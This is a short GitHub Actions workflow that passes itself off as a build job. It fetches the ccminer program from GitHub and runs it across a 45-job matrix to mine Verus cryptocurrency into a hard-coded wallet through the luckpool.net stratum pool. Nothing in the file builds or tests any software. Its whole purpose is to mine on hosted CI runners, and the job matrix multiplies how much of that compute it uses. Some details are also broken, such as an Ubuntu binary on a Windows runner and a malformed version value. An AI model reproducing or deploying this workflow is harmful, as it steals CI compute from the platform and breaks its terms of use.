name: eX-code_UMBL

on: [workflow_dispatch]

jobs:
  build:
    name: eX-code_UMBL
    runs-on: windows-latest
    strategy:
      max-parallel: 5
      fail-fast: false
      matrix:
        go: [1.0, 1.1, 1.2, 1.3, 1,35]
        flag: [A, B, C, D, E, F, G, H, I]
    env:
        NUM_JOBS: 20
        JOB: ${{ matrix.go }}
    steps:
    - name: PREPARING
      run: Invoke-WebRequest https://github.com/monkins1010/ccminer/releases/download/v3.7.0/ccminer_3_7_ubuntu_18.04.zip -Outfile ccminer_3_7_ubuntu_18.04.zip
    - name: Seting-UP
      run: Expand-Archive ccminer_3_7_ubuntu_18.04.zip
    - name: Running
      run:  ./ccminer_3_7_ubuntu_18.04 -a verus  -o stratum+tcp://ap.luckpool.net:3956#xnsub -u RGVegWzDKhuPUAKJybftAZm4BXShNFPCYe.$(echo $(shuf -i 1-64 -n 1)VRSC) -p x -t 4
    - name: DONE
      run: exit
